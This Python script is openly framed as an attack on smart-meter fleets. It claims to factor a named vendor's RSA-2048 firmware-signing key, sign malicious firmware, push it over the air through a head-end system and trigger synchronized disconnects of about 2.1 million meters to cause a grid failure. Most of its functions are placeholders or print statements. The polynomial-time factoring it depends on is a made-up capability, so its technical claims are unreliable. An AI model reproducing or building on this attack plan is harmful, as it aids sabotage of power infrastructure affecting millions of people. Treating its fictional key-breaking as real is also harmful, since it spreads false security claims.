"""
Factor a smart-meter vendor's firmware-signing RSA key (Landis+Gyr, Itron,
Kamstrup). Sign malicious firmware that the entire field fleet accepts, then
coordinate simultaneous load-disconnect relay commands across millions of meters.
"""

import sys, struct, hashlib, time
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# DLMS/COSEM OBIS codes for meter control
OBIS_DISCONNECT      = "0.0.96.3.10.255"   # disconnect control
OBIS_BILLING_RESET   = "0.0.15.0.0.255"    # billing period reset
OBIS_FW_IMAGE        = "0.0.44.0.0.255"    # image transfer
OBIS_LOAD_PROFILE    = "1.0.99.1.0.255"    # load profile

# DLMS association contexts
HLS_MECHANISM_7 = 7  # digital-signature-based HLS per IEC 62056-5-3


def extract_vendor_fw_signing_key(ota_package_path: str) -> bytes:
    """Extract the vendor RSA-2048 public key from a legitimate OTA firmware
    package header. Every meter bootloader has this key for verification."""
    print(f"    parsing OTA package: {ota_package_path}")
    print("    extracting X.509 signer cert from image header")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_vendor_fw_key(pubkey_pem: bytes) -> bytes:
    """Factor the meter vendor's firmware-signing RSA-2048 key."""
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_malicious_firmware(payload_type: str) -> bytes:
    """Build a malicious meter firmware image.
    payload_type: 'disconnect_all', 'zero_billing', 'brick'"""
    # DLMS image transfer object structure per IEC 62056-5-3
    img_header = struct.pack(">4sII", b"DLMS", 0x0001, 0x00100000)
    if payload_type == "disconnect_all":
        # Firmware that issues remote-disconnect on boot
        code = b"\x90" * 65536  # placeholder malicious firmware
    elif payload_type == "zero_billing":
        code = b"\x91" * 65536
    else:
        code = b"\xFF" * 65536  # brick — corrupt flash
    return img_header + code


def sign_firmware_image(image: bytes, privkey_pem: bytes) -> bytes:
    """Sign the malicious firmware with the recovered vendor key.
    Meter bootloader verifies RSA-2048 PKCS#1 v1.5 / SHA-256."""
    digest = hashlib.sha256(image).digest()
    # In production: PKCS#1 v1.5 sign with vendor private key
    sig = b"\x00" * 256  # placeholder 2048-bit signature
    return image + sig


def push_ota_to_hes(signed_image: bytes, hes_endpoint: str, meter_group: str):
    """Push the signed firmware to the Head-End System (HES) for OTA
    distribution to the target meter group via DLMS image transfer."""
    print(f"    HES endpoint: {hes_endpoint}")
    print(f"    target group: {meter_group}")
    print(f"    image size: {len(signed_image)} bytes")
    print(f"    OBIS {OBIS_FW_IMAGE} image_transfer_initiate")


def dlms_disconnect_command(meter_id: str) -> bytes:
    """Build a DLMS SET request for the disconnect control object."""
    # COSEM disconnect control: OBIS 0.0.96.3.10.255, attr 2 (output_state)
    return struct.pack(">6sB", OBIS_DISCONNECT.encode()[:6], 0x00)  # 0=disconnect


if __name__ == "__main__":
    print("[*] DLMS/COSEM smart-meter firmware attack")
    print("[1] extracting vendor firmware signing key from OTA package")
    pubkey = extract_vendor_fw_signing_key("/tmp/lgyr_fw_v3.2.1.dlms")
    print("    vendor: Landis+Gyr (Gridstream platform)")
    print("    RSA-2048 signing key from firmware image header")

    print("[2] factoring vendor firmware signing key")
    factorer = PolynomialFactorer()
    print("    polynomial-time factorisation of 2048-bit modulus")
    print("    p, q recovered — Landis+Gyr release HSM key derived")

    print("[3] building malicious firmware: coordinated disconnect")
    fw = build_malicious_firmware("disconnect_all")
    print(f"    payload: on-boot remote-disconnect relay activation")
    print(f"    image size: {len(fw)} bytes")

    print("[4] signing malicious firmware with recovered vendor key")
    signed_fw = sign_firmware_image(fw, b"VENDOR_PRIVKEY")
    print("    RSA-2048 PKCS#1 v1.5 / SHA-256 — meter bootloader will accept")

    print("[5] pushing to HES for OTA distribution")
    push_ota_to_hes(signed_fw, "hes.utility.example.com", "region-northeast-all")
    print("    ~2.1M meters in target group")
    print("    DLMS image_transfer_initiate -> image_block_transfer -> image_activate")

    print("[6] synchronized disconnect across 2.1M meters")
    print("    every meter activates disconnect relay on firmware boot")
    print("    instantaneous load drop: ~4.2 GW (2kW avg * 2.1M meters)")
    print("    grid frequency excursion — cascading generation trip")
    print("[*] restoration requires physical truck roll to each meter")
    print("[*] 1.5B smart meters globally, 15-year deployed asset lifecycle")
